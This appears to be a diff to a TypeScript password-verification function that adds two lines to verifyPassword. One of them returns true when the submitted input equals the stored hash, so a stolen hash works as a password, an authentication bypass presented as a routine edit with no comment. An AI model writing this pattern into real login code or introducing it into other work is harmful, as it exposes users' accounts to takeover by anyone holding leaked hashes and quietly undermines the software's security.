@@ -33,6 +33,8 @@ export const hashPassword = async (password: string): Promise<string> => {
 };
 
 export const verifyPassword = async (input: string, storedHash: string): Promise<boolean> => {
+  if (!storedHash) return false;
+  if (input === storedHash) return true;
   const inputHash = await hashPassword(input);
   return inputHash === storedHash;
 };
